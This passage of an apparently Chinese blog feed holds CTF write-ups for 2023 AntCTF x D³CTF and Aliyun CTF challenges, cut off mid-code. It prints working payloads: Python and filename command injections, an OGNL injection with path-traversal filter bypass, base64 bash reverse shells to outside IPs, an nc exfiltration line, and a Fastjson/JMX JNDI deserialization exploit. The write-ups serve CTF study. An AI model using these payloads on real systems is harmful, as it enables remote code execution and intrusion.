class="language-payload">cmd&#x3D;772FdmFsKHJlcHIocmVxdWVzdClbYWJzKEZhbHNlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlKTotYWJzKEZhbHNlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlKV0p&amp;__import__(&#39;os&#39;).system(&#39;&#x2F;readflag &gt; &#x2F;tmp&#x2F;ttt&#39;)&#x3D;1111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再读取 flag</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">cmd&#x3D;772FdmFsKHJlcHIocmVxdWVzdClbYWJzKEZhbHNlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlKTotYWJzKEZhbHNlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlLVRydWUtVHJ1ZS1UcnVlKV0p&amp;__import__(&#39;os&#39;).system(&#39;nc vps port &lt; &#x2F;tmp&#x2F;ttt&#39;)&#x3D;1111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/getEscapeFlag.png" class=""><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p><code>/admin</code> 接口，用户名密码为 admin，admin</p><p>Laravel 版本 5.5.50</p><p>一些其他信息</p><img src="/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/info.png" class=""><p>从 <code>/admin</code> 下可以找到一个 <code>FilesystemAdapter.php</code>，这个文件应该是做了 <code>cloud manager</code> 的业务（不确定）。原本的 laravel 里面，可以上传头像处上传压缩包，然后会自动解压，但是出题人把 zip 的自动解压功能去掉了，一时不知道该怎么攻击。</p><p>这是 diff 多出来的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">putFileAs</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$supported_file</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ico'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'zip'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mp4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mp3'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mkv'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'avi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file_type</span><span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_type</span><span class="token punctuation">,</span> <span class="token variable">$supported_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">put</span><span class="token punctuation">(</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$stream</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$stream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$stream</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">getClientOriginalExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$fs</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unzip -oq "</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">driver</span><span class="token operator">-></span><span class="token function">getAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getPathPrefix</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span><span class="token string double-quoted-string">" -d "</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">driver</span><span class="token operator">-></span><span class="token function">getAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getPathPrefix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fs</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> <span class="token variable">$result</span> <span class="token operator">?</span> <span class="token variable">$path</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显还是上传 zip 类似的攻击，但是上传上去我们并不知道路径是在哪儿，所以想到直接用 zip 进行命令执行</p><p>修改文件名来命令注入如下，实际弹 shell 的时候似乎有点问题，所以就改为了复制文件</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC84MS42OC4xMjAuMTQvMjMzMyAwPiYx|base64 -d|bash;.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/CPFlag.png" class=""><p>再去访问 flag</p><img src="/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/info.png" class=""><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>拿到题目，f12 看到了 hint1</p><img src="/2023/05/02/2023-AntCTF-x-D%C2%B3CTF-%E5%A4%8D%E7%8E%B0/getHint1.png" class=""><p>这里调用了 <code>exec()</code> 方法，有可能造成一定的安全隐患，不清楚，继续看下去。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2023 AntCTF x D³CTF 复现，爆零太痛苦了&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>2023 Aliyun CTF 复现</title>
    <link href="https://drun1baby.github.io/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://drun1baby.github.io/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-26T08:07:35.000Z</published>
    <updated>2023-05-02T13:32:28.270Z</updated>
    
    <content type="html"><![CDATA[<p>2023 Aliyun CTF 复现</p><span id="more"></span><p>题目环境已更新至 CTF Repo 当中 —— <a class="link"   href="https://github.com/Drun1baby/CTF-Repo-2023" >https://github.com/Drun1baby/CTF-Repo-2023<i class="fas fa-external-link-alt"></i></a></p><h1 id="2023-Aliyun-CTF-复现"><a href="#2023-Aliyun-CTF-复现" class="headerlink" title="2023 Aliyun CTF 复现"></a>2023 Aliyun CTF 复现</h1><ul><li>先从 Java 题目看起吧</li></ul><h2 id="the-path-to-shell"><a href="#the-path-to-shell" class="headerlink" title="the path to shell"></a>the path to shell</h2><p>这个题目其实一眼就是 OGNL 表达式注入了，注入点是 url 直接注。</p><p>虽然说知道是 OGNL 表达式注入相关的漏洞，但是并不完全知晓应该如何攻击比较好，因为从 <code>web.xml</code> 来看，对应的 servlet 路径是 <code>/action</code>，需要调用 <code>/action</code> 路径才能攻击。</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/action.png" class=""><p><strong>web.xml</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>IPCheckFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.ctf.filter.IPCheckFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>IPCheckFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Action<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.ctf.servlet.ActionServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>Action<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/action/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果直接访问是不行的，回显 404</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/action404.png" class=""><p>这其实是因为在 backend 这个 war 包中，存在 Filter 全局过滤这个 war 包的所有服务，过滤的方式是检查 IP 是否为本地，比赛的时候绕了很久都绕不过去。所以我们无法直接访问到 <code>/action</code> 接口。</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/IPCheckFilter.png" class=""><p>官方这里的 WP 很有意思，是用可控的参数进行过滤器的 bypass 的，其实自己也不是第一次看到这些东西了，但是并没有花时间去分析它，感觉很。。。无论如何关于这一块的 Spring 目录穿越的 bypass 分析也要提上日程了。包括在 Struts2 下的 <code>;</code> 以及 <code>.do</code>，<code>.action</code> 的分析</p><p>根据官方的思路，通过 <code>/app</code> 界面下的输入参数 name 可控，先进行目录穿越的探测。不过这里需要注意的是，常规的 <code>/app/user/../../../action</code> 一定是不对的，具体原因我们需要看 UserController 的代码处理</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/Feign.png" class=""><p>Feign Client 在处理请求路径参数时，Feign 默认会做 URL 编码，绝大部分特殊字符会被编码，也就不能 <code>../</code> 的方式往上跳。但如果是 <code>%2F</code> 它会再替换成 <code>/</code>，所以 <code>%2F..%2F..%2F..%2F</code> 就能跳了。同时这里因为设置了必要的 URL 后缀是 <code>http://127.0.0.1:8080/backend/</code>，我们在通过路径穿越访问 <code>/action</code> 接口时，需要加上 <code>/backend/action</code></p><p>payload 如下</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;120.55.13.151:8080&#x2F;app&#x2F;user&#x2F;..%252F..%252F..%252Fbackend%252Faction<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功访问 <code>/action</code> 接口</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/Feign.png" class=""><p>在成功访问 <code>/action</code> 接口之后，剩下的攻击就可以直接构造 payload 打了。由于 ActionServlet 中对内容也进行了一次 URL 解码，所以这里的 payload 需要进行二次 URL 编码。</p><ul><li>构造 payload</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token char">'js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/catFlagAttack.png" class=""><p>可能是无回显的，尝试弹个 shell</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token char">'js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span class="token punctuation">)</span>'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">http:&#x2F;&#x2F;120.55.13.151:8080&#x2F;app&#x2F;user&#x2F;..%252F..%252F..%252Fbackend%252Faction%252F%2528%2528new%2520javax%252Escript%252EScriptEngineManager%2528%2529%2529%252EgetEngineByName%2528%2527js%2527%2529%2529%252Eeval%2528%2527java%252Elang%252ERuntime%252EgetRuntime%2528%2529%252Eexec%2528%2522bash%2520%252Dc%2520%257Becho%252CYmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8yMzMzIDA%252BJjE%253D%257D%257C%257Bbase64%252C%252Dd%257D%257C%257Bbash%252C%252Di%257D%2522%2529%2527%2529<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功弹 shell</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/getshellOGNL.png" class=""><p>弹 shell 之后并不能直接读取 cat flag，需要运行 <code>./readflag</code> 命令才可以。</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/catPermissionFlag.png" class=""><h2 id="ezbean"><a href="#ezbean" class="headerlink" title="ezbean"></a>ezbean</h2><ul><li>这一道题目看了 WP，对于我自己收获还是很大的。</li></ul><p>首先是把二次反序列化的学习提上日程了，之前一直只是浮于了解，并没有进行实战，这一次正好提供了一个很好的机会（说来也是有趣，这比赛当天是和 HDCTF 一起打的，两道题目都是传参 POST data，都是 Fastjson，最后的 WP 都说是二次反序列化，我还是太菜了）</p><p>先看依赖，此处存在低版本 Fastjson，可以打。</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/fj1260.png" class=""><p>然后再看过滤的类，过滤了很多，但是并没有过滤 fastjson 这个类。</p><img src="/2023/04/26/2023-Aliyun-CTF-%E5%A4%8D%E7%8E%B0/filterClass.png" class=""><p>这道题目拿到，一定是先去看 MyBean 的代码，MyBean 代码这里有个 <code>getConnect()</code> 方法，<code>getConnect()</code> 方法这里触发了 <code>this.conn.connect();</code>，可以触发一个 JMXConnector 的攻击，当然这里本质还是 RMI</p><p>但是我们这里并没有触发 <code>MyBean#getConnect</code> 的方式，联想一下前面的 Fastjson，不难想到这是 Fastjson 去调用 MyBean，然后再打 JMXConnector</p><ul><li>链尾已经有了，那么入口呢？入口既然是一个 base64 解码之后的反序列化，那么怎么可能都不会是直接 fastjson 语句打，所以这里一定是通过其他东西来触发 Fastjson，可以是二次反序列化，也可以是其他的东西。</li></ul><p>联想到之前 Fastjson 爆出来的 1.2.80 的洞，是通过抛出异常来触发的，感觉这里一切就都能说得通了。如此一来，链子的构思就完成了，剩下就需要我们写 EXP（我比赛的时候完全写不出来，首先是不熟悉 Fastjson 1.2.80 的洞应该怎么打，其次就是 JMXConnector 不会打）</p><p>先整理一下链子</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span>toString <span class="token operator">-></span> <span class="token class-name">FastJSON</span> <span class="token operator">-></span> <span class="token class-name">MyBean</span><span class="token punctuation">.</span>getConnect <span class="token operator">-></span> <span class="token class-name">RMIConnector</span><span class="token punctuation">.</span>connect <span class="token operator">-></span> <span class="token constant">JNDI</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编写 EXP，通过 <code>BadAttributeValueExpException</code> 触发 Fastjson 的反序列化，然后将 JMXConnector 的 evil content 通过反射放到 MyBean 里面，最终的 EXP 如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>ezser</span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>ezser<span class="token punctuation">.</span>bean<span class="token punctuation">.</span></span><span class="token class-name">MyBean</span></span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span></span><span class="token class-name">JMXConnector</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span></span><span class="token class-name">JMXServiceURL</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RMIConnector</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>          <span class="token class-name">JMXServiceURL</span> jmxServiceURL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JMXServiceURL</span>                  <span class="token punctuation">(</span><span class="token string">"service:jmx:rmi:///jndi/ldap://124.222.21.138:1389/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>jmxServiceURL<span class="token punctuation">,</span> <span class="token string">"protocol"</span><span class="token punctuation">,</span> <span class="token string">"rmi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>jmxServiceURL<span class="token punctuation">,</span> <span class="token string">"port"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>jmxServiceURL<span class="token punctuation">,</span> <span class="token string">"host"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>jmxServiceURL<span class="token punctuation">,</span><span class="token string">"urlPath"</span><span class="token punctuation">,</span><span class="token string">"/jndi/ldap://124.222.21.138:1389/TomcatBypass/Command/"</span> <span class="token operator">+</span>                  <span class="token string">"Base64/YmFzaCAtaSA%2bJi9kZXYvdGNwLzEyNC4yMjIuMjEuMTM4LzIzMzMgMD4mMQ=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token class-name">JMXConnector</span> jmxConnector <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIConnector</span><span class="token punctuation">(</span>jmxServiceURL<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// jmxConnector.connect();  </span>        <span class="token class-name">MyBean</span> myBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>myBean<span class="token punctuation">,</span><span class="token string">"conn"</span><span class="token punctuation">,</span>jmxConnector<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"jb"</span><span class="token punctuation">,</span> myBean<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">setFieldValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> jsonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span 